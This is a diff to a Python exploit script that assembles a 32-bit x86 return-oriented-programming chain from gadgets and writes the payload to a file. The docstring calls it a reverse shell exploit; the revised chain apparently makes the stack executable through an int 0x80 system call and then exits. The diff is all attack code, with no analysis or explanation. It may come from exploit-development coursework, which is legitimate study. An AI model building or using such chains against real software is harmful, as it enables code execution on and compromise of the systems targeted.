@@ -10,6 +10,8 @@ rop = exploit_gadgets.ROPgadgets(binary_name)
 POPEDX    = pack('<I', rop.get_gadget("pop edx ; ret")) # pop edx ; ret
 POPEAX    = pack('<I', rop.get_gadget("pop eax ; ret")) # pop eax ; ret
 ADDEAXEDX = pack('<I', rop.get_gadget("add eax, edx ; ret")) # add eax, edx ; ret
+ADDECXECX = pack('<I', rop.get_gadget("add ecx, ecx ; ret"))
+ADDEAXECX = pack('<I', rop.get_gadget("add eax, ecx ; ret"))
 
 MOVISTACK = pack('<I', rop.get_gadget("mov dword ptr [edx], eax ; ret")) # mov dword ptr [edx], eax ; ret
 XOREAX    = pack('<I', rop.get_gadget("xor eax, eax ; ret")) # xor eax, eax ; ret
@@ -17,6 +19,7 @@ INCEAX    = pack('<I', rop.get_gadget("inc eax ; ret")) # inc eax ; ret
 INCEBX    = pack('<I', rop.get_gadget("inc ebx ; ret")) # inc ebx ; ret
 
 INCECX    = pack('<I', rop.get_gadget("inc ecx ; ret")) # inc ecx ; ret
+INCEDX    = pack('<I', rop.get_gadget("inc edx ; ret")) # inc edx ; ret
 DECEDX    = pack('<I', rop.get_gadget("dec edx ; ret")) # dec edx ; ret
 INT80     = pack('<I', 0x0806f7c0) # int 0x80
 NOP       = pack('<I', rop.get_gadget("nop ; ret")) # nop
@@ -97,7 +100,7 @@ def create_shadow_stack_ropchain(cli_args, base_address, shadow_stack_offset):
     return p
 
 
-def rop_exploit(cli_args, base_address):
+def rop_exploit(base_address):
     """Create the full ROP chain reverse shell exploit
 
     :param cli_args: The command line arguments
@@ -110,33 +113,29 @@ def rop_exploit(cli_args, base_address):
     STACK     = pack('<I', data)
     exploit = b'\x41' * padding
 
-    exploit += create_stack_ropchain(cli_args,data)
-    exploit += address_pop.pop_reg(data,POPEBX,0,INCEBX,"inc")
-    exploit += create_shadow_stack_ropchain(cli_args,data,60)
     
-
-    exploit += address_pop.pop_reg(data + 60,POPECXEBX,0,INCECX,"inc")
-    # exploit += address_pop.pop_reg(data,NOP,0,INCEBX,"inc")
-    exploit += pack('<I', 0x01020304) # padding without overwrite ebx
-    exploit += address_pop.pop_reg(data,POPEBX,0,INCEBX,"inc")
-
-    exploit += address_pop.pop_reg(data + 48,POPEDX,0,DECEDX,"dec")
-
+    
+    exploit += address_pop.doubadd(0x0000007D,ADDECXECX,INCECX)
     exploit += XOREAX # xor eax, eax ; ret
-    exploit += INCEAX * 11 # inc eax ; ret 11 times
+    exploit += ADDEAXECX
+    exploit += address_pop.doubadd(0x00021000,ADDECXECX,INCECX)
+    exploit += address_pop.pop_reg(0xfffdd000,POPEBX,0,INCEBX,"inc")
+
+    exploit += address_pop.pop_reg(0xffffffff,POPEDX,0,DECEDX,"dec")
+    exploit += INCEDX * 8
     exploit += INT80 # int 0x80
+    exploit += XOREAX
+    exploit += INCEAX
+    exploit += INT80
+
+    exploit += b'A' * 100
     return exploit
 
 
 def test():
-    params = input("Enter exploit parameters: ")
-    args = []
-    for arg in params.split():
-        args.append(preprocess(arg))
-
     fileName=input("Enter the file name: ")
     outfile=open(fileName, "wb")
-    outfile.write(rop_exploit(args, 0x080da060))
+    outfile.write(rop_exploit(0x080da060))
     outfile.close()
 
 
